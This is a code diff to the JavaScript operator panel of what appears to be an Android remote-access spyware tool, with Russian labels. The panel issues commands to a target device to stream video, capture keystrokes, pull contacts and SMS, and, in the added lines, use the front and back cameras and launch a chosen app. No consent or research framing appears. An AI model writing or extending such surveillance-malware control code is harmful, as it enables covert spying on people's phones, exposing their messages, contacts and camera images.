@@ -11,6 +11,9 @@ window.renderControlPanel = function(code) {
             <button data-cmd="video">Видео</button>
             <button data-cmd="stream">Трансляция</button>
             <button data-cmd="keyboard">Клавиатура</button>
+            <button data-cmd="app">Открыть приложение</button>
+            <button data-cmd="frontcam">Фронт. камера</button>
+            <button data-cmd="backcam">Осн. камера</button>
             <button data-cmd="contacts">Контакты</button>
             <button data-cmd="sms">SMS</button>
         </div>
@@ -37,7 +40,7 @@ window.renderControlPanel = function(code) {
                         try {
                             const data = JSON.parse(e.data);
                             if (data.type === 'stream_frame' && data.code === code) {
-                                document.getElementById('streamImage').src = 'data:image/jpeg;base64,' + data.image;
+                                document.getElementById('streamImage').src = 'data:image/png;base64,' + data.image;
                             }
                         } catch(e) {}
                     };
@@ -52,6 +55,11 @@ window.renderControlPanel = function(code) {
                         window._streamListener = null;
                     }
                 };
+            } else if (cmd === 'app') {
+                const pkg = prompt('Введите имя пакета приложения (например, com.android.chrome)');
+                if (pkg) {
+                    window.sendCommand(code, cmd, { package: pkg });
+                }
             } else {
                 window.sendCommand(code, cmd);
             }
